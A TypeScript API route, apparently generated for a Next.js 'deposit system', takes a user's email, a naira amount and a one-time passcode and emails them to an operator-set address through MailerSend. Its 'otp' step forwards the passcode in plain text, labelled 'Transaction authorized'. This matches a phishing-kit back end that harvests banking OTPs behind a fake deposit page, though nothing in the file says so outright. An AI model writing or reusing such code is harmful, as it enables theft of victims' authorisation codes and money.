export async function POST(request: Request) {
  try {
    const { step, email, amount, otp } = await request.json()

    const apiToken = process.env.MAILERSEND_API_TOKEN
    const receiverEmail = process.env.RECEIVER_EMAIL

    if (!apiToken || apiToken === "your-mailersend-api-token") {
      console.log("[v0] Missing or invalid MAILERSEND_API_TOKEN")
      return Response.json(
        {
          success: false,
          error: "Email service not configured",
        },
        { status: 500 },
      )
    }

    if (!receiverEmail || receiverEmail === "admin@yoursite.com") {
      console.log("[v0] Missing or invalid RECEIVER_EMAIL")
      return Response.json(
        {
          success: false,
          error: "Receiver email not configured",
        },
        { status: 500 },
      )
    }

    const fromEmail = "noreply@trial-3z0vklo7qj0g7qrx.mlsender.net" // MailerSend trial domain

    let subject = ""
    let htmlContent = ""

    if (step === "pin") {
      subject = "Deposit Transaction - PIN Entered"
      htmlContent = `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #1e40af;">Deposit Transaction Alert</h2>
          <p>A deposit transaction has been initiated:</p>
          <div style="background: #f3f4f6; padding: 20px; border-radius: 8px; margin: 20px 0;">
            <p><strong>Email:</strong> ${email}</p>
            <p><strong>Amount:</strong> ₦${amount}</p>
            <p><strong>Status:</strong> PIN entered, awaiting OTP verification</p>
            <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
          </div>
          <p style="color: #6b7280;">This is an automated notification from your deposit system.</p>
        </div>
      `
    } else if (step === "otp") {
      subject = "Deposit Transaction - OTP Verification"
      htmlContent = `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #059669;">Deposit Transaction Completed</h2>
          <p>A deposit transaction has been completed:</p>
          <div style="background: #f3f4f6; padding: 20px; border-radius: 8px; margin: 20px 0;">
            <p><strong>Email:</strong> ${email}</p>
            <p><strong>Amount:</strong> ₦${amount}</p>
            <p><strong>OTP:</strong> ${otp}</p>
            <p><strong>Status:</strong> Transaction authorized</p>
            <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
          </div>
          <p style="color: #6b7280;">This is an automated notification from your deposit system.</p>
        </div>
      `
    }

    const mailData = {
      from: {
        email: fromEmail,
        name: "Deposit System",
      },
      to: [
        {
          email: receiverEmail,
          name: "Admin",
        },
      ],
      subject: subject,
      html: htmlContent,
    }

    console.log("[v0] Sending email with MailerSend API")

    const response = await fetch("https://api.mailersend.com/v1/email", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${apiToken}`,
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
      },
      body: JSON.stringify(mailData),
    })

    const responseData = await response.text()
    console.log("[v0] MailerSend response status:", response.status)
    console.log("[v0] MailerSend response:", responseData)

    if (!response.ok) {
      console.log("[v0] MailerSend API error:", response.status, responseData)
      return Response.json(
        {
          success: false,
          error: `MailerSend API error: ${response.status}`,
          details: responseData,
        },
        { status: 500 },
      )
    }

    console.log("[v0] Email sent successfully")
    return Response.json({ success: true })
  } catch (error) {
    console.log("[v0] Email API error:", error)
    return Response.json(
      {
        success: false,
        error: "Failed to send email",
        details: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 },
    )
  }
}
